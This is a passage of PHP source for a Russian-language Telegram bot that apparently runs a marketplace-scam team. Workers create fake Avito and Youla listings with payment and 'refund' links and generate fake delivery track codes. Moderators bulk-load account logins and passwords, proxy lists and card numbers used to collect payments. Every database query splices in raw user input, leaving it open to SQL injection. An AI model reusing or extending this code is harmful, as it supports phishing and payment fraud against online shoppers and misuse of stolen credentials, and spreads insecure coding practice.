						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodespost` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = $bot_chat["create_track"]["messages"]["waiting"];
						} else {
							mysqli_query($connection, "INSERT INTO `trackcodespost` (`code`, `worker`, `status`, `time`) VALUES ('".rand(1000000, 999999999999)."', '$message[from]', '0', '".time()."')");
							$text = $bot_chat["create_track"]["asks"]["pochta"]["1"];
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if($message['text'] == $main_keyboard_admin[3][0]) {
						if($user['access'] >= 666){
							$text = $bot_chat['change_payment']['header'];
							$keyboard = Array("keyboard" => $keyboards['payment_settings']);
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'reply_markup' => json_encode($keyboard), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
						}
					}

					if($message['text'] == $keyboards['payment_settings'][0][0]){
						if($user['access'] >= 666){
							$payment = $payments_array[$config['payment']];
							$text = "<b>Смена платежной системы</b> \n\n";
							$text .= "<b>Текущая платежная система:</b> <code>$payment</code>\n\n";
							$text .= "<b>На что хотите сменить?</b>";
							unset($payments_array[$config['payment']]);

							$keyboard = ['inline_keyboard' => [
									[],
								]
							];
							$i = 0;
							$k = 0;
							foreach ($payments_array as $key => $value) {
								$i++;
								$keyboard['inline_keyboard'][$k][] = ['text' => $value, 'callback_data' => "/payment/$key"];
								if($i == 3){
									$k++;
									$i = 0;
								}
							}
							$keyboard = json_encode($keyboard);
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}
					}

					if($message['text'] == $keyboards['payment_settings'][1][0]){
						if($user['access'] >= 666){
							$text = str_replace("\t", "", sprintf($bot_chat['change_payment']['header_3'], ($config['delcard'] == 0 ? $bot_chat['change_payment']['card_keyboard']['not_del'] : $bot_chat['change_payment']['card_keyboard']['del'])));

							if($config['delcard'] == 0){
								$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['change_payment']['card_keyboard']['del'], 'callback_data' => '/delcards/1'))));
							}elseif($config['delcard'] == 1){
								$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['change_payment']['card_keyboard']['not_del'], 'callback_data' => '/delcards/0'))));
							}
							$keyboard = json_encode($keyboard);
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}
					}

                    if($message['text'] == $main_keyboard_user[1][1]){
						$mails = mysqli_query($connection, "SELECT * FROM `sendmails` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($mails) == 0){
							$text = $bot_chat['sendmails']['messages']['1'];
							$keyboard = json_encode(Array('keyboard' => $keyboards['sendmails'], 'resize_keyboard' => TRUE, 'one_time_keyboard' => TRUE));
							$this_date = time();
							mysqli_query($connection, "INSERT INTO `sendmails`(`worker`, `time`, `status`) VALUES ('$message[from]', '$this_date', '0')");
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}else{
							mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `status` = '0' AND `worker` = '$message[from]'");
							$text = $bot_chat['sendmails']['messages']['1'];
							$keyboard = json_encode(Array('keyboard' => $keyboards['sendmails'], 'resize_keyboard' => TRUE, 'one_time_keyboard' => TRUE));
							$this_date = time();
							mysqli_query($connection, "INSERT INTO `sendmails`(`worker`, `time`, `status`) VALUES ('$message[from]', '$this_date', '0')");
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}
					}

					if($message['text'] == $main_keyboard_user[3][1]){
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['tovarka']['header'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
					}

					if(preg_match('/\/info/i', $message['text']) == TRUE) {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
					
					if(preg_match('/\/adverts/i', $message['text']) == TRUE) {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyAdverts($message['from'], 0), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyAdverts($message['from'], 0, 1)));
					}
				} else {
					$users = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));
					
					$requests = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `rules`, `status`, `value1_type` FROM `requests` WHERE `telegram` = '$message[from]' AND `status` != '-1' AND `status` < '3' ORDER BY `id` DESC");
				
					if(mysqli_num_rows($requests) > 0) {
						$request = mysqli_fetch_assoc($requests);
						if($request['status'] == 1) {
							$text = str_replace("\t", "", sprintf($callbacks['join']['values'][$request['status']], $callbacks['join']['value1']['values'][$request['value1_type']], $request['value1'], $request['value2'], $request['value3']));

							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $callbacks['join']['keyboard']['send'], 'callback_data' => '/join/send/'), Array('text' => $callbacks['join']['keyboard']['cancel'], 'callback_data' => '/join/cancel/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						} elseif($request['status'] == 2) {
							$text = $callbacks['join']['values']['2'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($message['text']) AND $request['rules'] == '0') {
							$text = $callbacks['join']['get_accept'];
							$text .= str_replace("\t", "", $callbacks['join']['rules']['not_accept']);
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $callbacks['join']['keyboard']['accept'], 'callback_data' => '/join/accept/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						} elseif(empty($request['value1']) AND empty($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1') {
							if($request['value1_type'] != '-1'){
								mysqli_query($connection, "UPDATE `requests` SET `value1` = '$message[text]' WHERE `telegram` = '$message[from]' AND `status` = '0'");
								$text = $callbacks['join']['values']['4'];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}else{
								$text = $callbacks['join']['value1']['errors']['not_select'];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(isset($request['value1']) AND empty($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1' AND $request['value1_type'] != '-1') {
							mysqli_query($connection, "UPDATE `requests` SET `value2` = '$message[text]' WHERE `telegram` = '$message[from]' AND `status` = '0'");
							$text = $callbacks['join']['values']['5'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND isset($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1' AND $request['value1_type'] != '-1') {
								mysqli_query($connection, "UPDATE `requests` SET `value3` = '$message[text]', `status` = '1' WHERE `telegram` = '$message[from]' AND `status` = '0'");
								
								$text = str_replace("\t", "", sprintf($callbacks['join']['values']['1'], 
									$callbacks['join']['value1']['values'][$request['value1_type']],
									$request['value1'], 
									$request['value2'], 
									$message['text']
								));

								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $callbacks['join']['keyboard']['send'], 'callback_data' => '/join/send/'), Array('text' => $callbacks['join']['keyboard']['cancel'], 'callback_data' => '/join/cancel/')))));
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								$text = sprintf($callbacks['join']['wait_complete'], $message['from'], $message['firstname'], $message['lastname']);
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					} else {
						if($users['access'] == '-1') {
							$text = $callbacks['join']['banned'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = str_replace("\t", "", $callbacks['join']['not_reg']);
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $callbacks['join']['keyboard']['add_new'], 'callback_data' => '/join/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}
					}
				}
			}
			
			// ===================== [ ЧАТ МОДЕРАТОРОВ ] ===================== //
			
			if($message['chat_id'] == $config['chat']['moders']) {
				$isAccess = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` >= '666'");
					
				if(mysqli_num_rows($isAccess) > 0) {
					if($message['text'] == '/help') {

						$text = str_replace("\t", "", $moder_chat['commands']);
						
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
					
					if(preg_match('/\/sendall/i', $message['text']) == TRUE) {
						$message = substr($message['text'], 9);
						$users = mysqli_query($connection,"SELECT `telegram` FROM `accounts` WHERE `access` = '666'");
						$cnt = mysqli_num_rows($users);
						while( $row = mysqli_fetch_assoc($users) ){
							$x++;
							if($x > $cnt){
								die();
							}else{
						        if($row['telegram'] > 0){
						        	send($config['token'], 'sendMessage', Array('chat_id' => $row['telegram'], 'text' => $message, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						        }
							}
      					}	    
        			    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['sendall']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					if(preg_match('/\/kickunactive/i', $message['text']) == TRUE){
						$query = mysqli_query($connection, "SELECT * FROM `accounts` WHERE `access` = '1'");

						if(mysqli_num_rows($query) > 0) {
							while($row = mysqli_fetch_assoc($query)) {
								$deltatime = time() - $row['created'];
								if($deltatime > 1814400){
									$payments = mysqli_query($connection, "SELECT * FROM `payments` WHERE `worker` = '$row[telegram]' ORDER by `id` DESC LIMIT 1");
									if(mysqli_num_rows($payments) > 0){
										$payment = mysqli_fetch_assoc($payments);
										$deltatime = time() - $payment['time'];
										if($deltatime > 1814400){
											mysqli_query($connection, "UPDATE `accounts` SET `access` = '0' WHERE `telegram` = '$row[telegram]'");
											mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
											mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
											mysqli_query($connection, "UPDATE `trackcodessdek` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
											mysqli_query($connection, "UPDATE `trackcodespek` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
											mysqli_query($connection, "UPDATE `trackcodespost` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
											
											send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $row['telegram'], 'until_date' => time()+24*500*3600));
											send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $row['telegram'], 'until_date' => time()+24*500*3600));
											
											$text = "🚷 <b>Ваш аккаунт был отключен из-за отсутствия активности</b>\n\n";
											$text .= "Вы в любое время можете подать заявку заново и вернуться в команду";
											send($config['token'], 'sendMessage', Array('chat_id' => $row['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											
											$text = "🚷 <a href=\"tg://user?id=$row[telegram]\">Воркер</a> <b>был отключен из-за отсутствия активности</b>\n\n";
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										}
									}else{
										mysqli_query($connection, "UPDATE `accounts` SET `access` = '0' WHERE `telegram` = '$row[telegram]'");
										mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
										mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
										mysqli_query($connection, "UPDATE `trackcodessdek` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
										mysqli_query($connection, "UPDATE `trackcodespek` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
										mysqli_query($connection, "UPDATE `trackcodespost` SET `status` = '-1' WHERE `worker` = '$row[telegram]'");
										
										send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $row['telegram'], 'until_date' => time()+24*500*3600));
										send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $row['telegram'], 'until_date' => time()+24*500*3600));
										
										$text = "🚷 <b>Ваш аккаунт был отключен из-за отсутствия активности</b>\n\n";
										$text .= "Вы в любое время можете подать заявку заново и вернуться в команду";
										send($config['token'], 'sendMessage', Array('chat_id' => $row['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										
										$text = "🚷 <a href=\"tg://user?id=$row[telegram]\">Воркер</a> <b>был отключен из-за отсутствия активности</b>\n\n";
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									}
								}			
							}
						}
					}

					if(preg_match('/\/botoff/i', $message['text']) == TRUE) {
						$check_state = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `config`"));
						if($check_state['status'] == 0){
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['bot']['status']['alr_off'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}else{
							mysqli_query($connection, "UPDATE `config` SET `status` = '0'");
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['bot']['status']['off'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if(preg_match('/\/boton/i', $message['text']) == TRUE) {
						$check_state = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `config`"));
						if($check_state['status'] == 1){
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['bot']['status']['alr_on'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}else{
							mysqli_query($connection, "UPDATE `config` SET `status` = '1'");
							$users = mysqli_query($connection, "SELECT * FROM `accounts` WHERE `access` > '0'");
							while( $row = mysqli_fetch_assoc($users) ){
							    if($row['access'] == '666'){
							        send($config['token'], 'sendMessage', Array('chat_id' => $row['telegram'], 'text' => $moder_chat['bot']['status']['user_mess'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $adminKeyboard));
							    }else{
							        send($config['token'], 'sendMessage', Array('chat_id' => $row['telegram'], 'text' => $moder_chat['bot']['status']['user_mess'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $defaultKeyboard));
							    }
            			        
            			    }
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['bot']['status']['on'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if(preg_match('/\/addaccount/i', $message['text']) == TRUE) {
						$account = substr($message['text'], 12);
						$check = strpos($account, "\n");
						if($check > 0){
							$accounts = explode("\n", $account);
							foreach ($accounts as $key => $value) {
								$account = explode(";", $value);
								if(count($account) == 4){
									$time = time();
									mysqli_query($connection, "INSERT INTO `free`(`type`, `login`,`phone`, `password`, `status`, `time`) VALUES ('$account[0]', '$account[1]', '$account[2]', '$account[3]', '0', '$time')");
								}
							}
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['addaccount']['messages']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}else{
							$account = explode(";", $account);
							if(count($account) == 4){
								$time = time();
								mysqli_query($connection, "INSERT INTO `free`(`type`, `login`, `password`,`phone`, `status`, `time`) VALUES ('$account[0]', '$account[1]', '$account[2]','$account[3]', '0', '$time')");
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['addaccount']['messages']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}else{
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['addaccount']['messages']['help'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					}

                    if(preg_match('/\/clear/i', $message['text']) == TRUE) {
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => "команда поймана", 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        curl_get_contents("/clear.php");
					}


					if(preg_match('/\/loadaccs/i', $message['text']) == TRUE) {

    					$acs = file_get_contents("acc.txt");
    
    					if (!$acs)
    					{
    					    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['loadaccs']['messages']['empty'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
    					    
    					}
    					else
    					{
    					    $check = strpos($acs, "\n");
    					    if ($check == 0)
    					    {
    					        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['loadaccs']['messages']['valueerror'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
    					        
    					    }
    					    else
    					    {
    					        $accounts = explode("\n", $acs);
    
    					        foreach ($accounts as $key => $value)
    					        {
    
    					        	$account = explode(";", $value);
    					            if (count($account) == 4)
    					            {
    					                $time = time();
    
    					                if ($account[0] == 0)
    					                {
    					                    $service = "avito";
    					                }
    					                elseif ($account[0] == 1)
    					                {
    					                    $service = "youla";
    					                }
    					                else
    					                {
    					                    $service = "unknown";
    					                    continue;
    					                }
    									mysqli_query($connection, "INSERT INTO `free`(`type`, `login`, `password`,`phone`, `status`, `time`) VALUES ('$account[0]', '$account[1]', '$account[2]', '$account[3]', '0', '$time')");
    					
    					                $found += 1;
    					            }
    					            else
    					            {
    					                continue;
    
    					            }
    					        }
    					        if ($found >= 1){
    
    					        	send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => "<b>$found".$moder_chat['loadaccs']['messages']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
    					        }
    					        else{
    					        	send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['loadaccs']['messages']['error'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
    					        }
    					    }
    					}

					}
					
					
					
					
					if(preg_match('/\/loadproxy/i', $message['text']) == TRUE) 
  {
    $prx = file_get_contents("proxy.txt");

    if (!$prx)
    {
    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['loadproxy']['messages']['empty'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
    }
    else
    {
    $check = strpos($prx, "\n");
      if ($check == 0)
      {
        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['loadproxy']['messages']['valueerror'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
        
      }
      else
      {
        $proxy_arr = explode("\n", $prx);

        foreach ($proxy_arr as $key => $value)
        {
            $is_proxy = explode(";", $value);
        if (count($is_proxy) != 2) continue;
        mysqli_query($connection, "INSERT INTO proxyList(proxy) VALUES ('$value')");
        
        $found += 1;
          
        }
        if ($found >= 1){

        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => "<b>$found".$moder_chat['loadproxy']['messages']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
        }
        else{
        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['loadproxy']['messages']['error'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
        }
      }
    }

  }
					
										if(preg_match('/\/remproxy/i', $message['text']) == TRUE){
						mysqli_query($connection, "TRUNCATE TABLE `proxyList`");
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => "Прокси успешно удалены", 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					
					
					
										if(preg_match('/\/addcards/i', $message['text']) == TRUE){
						$cards = substr($message['text'], 10);
						if(strlen($cards) > 16){
							$cards = explode(";", $cards);
							$add_cards = [];
							$card_list = "";
							foreach ($cards as $key => $value) {
								if(strlen($value) == 16 AND is_numeric($value)){
									$check_card = mysqli_query($connection, "SELECT `card` FROM `cards` WHERE `card` = '$value'");
									if(mysqli_num_rows($check_card) > 0){
										$add_cards[$value] = $moder_chat['addcards']['errors']['already'];
									}else{
										$add_cards[$value] = $moder_chat['addcards']['errors']['success'];
										$time = time();
										mysqli_query($connection, "INSERT INTO `cards`(`card`, `status`, `time`) VALUES ('$value','0','$time')");
									}
								}else{
									$add_cards[$value] = $moder_chat['addcards']['errors']['invalid'];
								}
							}
							foreach ($add_cards as $key => $value) {
								$card_list .= sprintf($moder_chat['addcards']['template'], $key, $value);
							}
							$text = str_replace("\t", "", sprintf($moder_chat['addcards']['header'], $card_list));
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}elseif(strlen($cards) == 16 AND is_numeric($cards)){
							$check_card = mysqli_query($connection, "SELECT `card` FROM `cards` WHERE `card` = '$cards'");
							if(mysqli_num_rows($check_card) > 0){

								$text = sprintf($moder_chat['addcards']['messages']['one_already'], $cards);
							}else{
								$text = sprintf($moder_chat['addcards']['messages']['one_success'], $cards);
								$time = time();
								mysqli_query($connection, "INSERT INTO `cards`(`card`, `status`, `time`) VALUES ('$cards','0',$time)");
							}
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}else{
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['addcards']['messages']['help'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if(preg_match('/\/getcards/i', $message['text']) == TRUE) {
						if(preg_match('/\/getcards \d{1,4}/i', $message['text']) == TRUE) {
							$count = substr($message['text'], 10);
							$cards = mysqli_query($connection, "SELECT * FROM `cards` ORDER by `id` DESC LIMIT $count");
							$text = sprintf($moder_chat['getcards']['header'], $count);
							while ($row = mysqli_fetch_assoc($cards)){
								$text .= sprintf($moder_chat['getcards']['template'], $row['card'], $moder_chat['getcards']['status'][$row['status']]);
							}
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}else{
							$text = $moder_chat['getcards']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if(preg_match('/\/reccards/i', $message['text']) == TRUE) {
						mysqli_query($connection, "UPDATE `cards` SET `status` = '0' WHERE `status` = '2'");
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['reccards']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					if(preg_match('/\/statcards/i', $message['text']) == TRUE){
						$cards_num = mysqli_num_rows(mysqli_query($connection, "SELECT * FROM `cards`"));
						$cards_n   = mysqli_num_rows(mysqli_query($connection, "SELECT * FROM `cards` WHERE `status` = '0'"));
						$cards_s   = mysqli_num_rows(mysqli_query($connection, "SELECT * FROM `cards` WHERE `status` = '2'"));

						$text = sprintf($moder_chat['statcards']['template'], $cards_num, $cards_n, $cards_u, $cards_s);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					if(preg_match('/\/settag/i', $message['text']) == TRUE) {
						if(preg_match('/\/settag (\d+|@{0,1}[\w.]+)/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 8));
							if(preg_match('/\/settag \d+/i', $message['text']) == TRUE) {
								$user = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `telegram` = '$edit[0]'");
							} elseif(preg_match('/\/settag @{0,1}[\w.]+/i', $message['text']) == TRUE) {
								$search = str_replace('@', '', $edit[0]);
								$user = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
							}
							
							if(mysqli_num_rows($user) > 0){
								if(strlen($edit[1]) >= 3){
									$user = mysqli_fetch_assoc($user);
									
									
									
									mysqli_query($connection, "UPDATE `accounts` SET `user_tag` = '$edit[1]' WHERE `telegram` = '$user[telegram]'");
									$text = $moder_chat['settag']['status']['success'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = sprintf($moder_chat['settag']['status']['user_mess'], $edit[1]);
									send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}else{
									$text = $moder_chat['settag']['status']['fail'];
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							}else{
								$text = $moder_chat['settag']['status']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $edit[1], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $moder_chat['settag']['status']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if(preg_match('/\/remcards/i', $message['text']) == TRUE){
						mysqli_query($connection, "TRUNCATE TABLE `cards`");
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $moder_chat['remcards']['messages']['success'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					if(preg_match('/^\/advert/i', $message['text']) == TRUE AND preg_match('/\/adverts/i', $message['text']) == FALSE) {
						if(preg_match('/^\/advert ([a-z0-9]{24}|\d+)$/i', $message['text']) == TRUE) {
							$advert_id = mb_substr($message['text'], 8);
							
							$advert = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert_id'");
							$boxberry = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `code` = '$advert_id'");
							$cdek = mysqli_query($connection, "SELECT * FROM `trackcodessdek` WHERE `code` = '$advert_id'");
							$pek = mysqli_query($connection, "SELECT * FROM `trackcodespek` WHERE `code` = '$advert_id'");
							$pochta = mysqli_query($connection, "SELECT * FROM `trackcodespost` WHERE `code` = '$advert_id'");
							
							if(mysqli_num_rows($advert) > 0){
								$advert = mysqli_fetch_assoc($advert);
								
								if($advert['type'] == 0) $url = $links['avito']."/buy/$advert_id" AND $platform = 'Авито';
								if($advert['type'] == 1) $url = $links['youla']."/buy/$advert_id" AND $platform = 'Юла';
								
								if($advert['delivery'] == 0) $advert['delivery'] = $settings['delivery'];

								$status = $moder_chat['advert']['status_a'][$advert['status']];
								
								$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));
								
								$text = str_replace("\t", "", sprintf($moder_chat['advert']['template_a'], 
									$advert['worker'], 
									$url,
									$advert_id, 
									$platform, 
									$advert['title'], 
									$advert['price'], 
									$advert['delivery'], 
									Endings($advert['views'], "просмотр", "просмотра", "просмотров"), 
									$status, 
									$payments['count'], 
									number_format($payments['total']), 
									date("d.m.Y в H:i:s", $advert['time'])
								));
								
								if($advert['type'] == 0) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $moder_chat['advert']['keyboard']['advert']['pay'], 'url' => $links['avito']."/buy/$advert_id"), Array('text' => $moder_chat['advert']['keyboard']['advert']['refund'], 'url' => $links['avito']."/refund/$advert_id"))));
								} elseif($advert['type'] == 1) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $moder_chat['advert']['keyboard']['advert']['pay'], 'url' => $links['youla']."/buy/$advert_id"), Array('text' => $moder_chat['advert']['keyboard']['advert']['refund'], 'url' => $links['youla']."/refund/$advert_id"))));
								}
								
								if($advert['status'] == -1) {
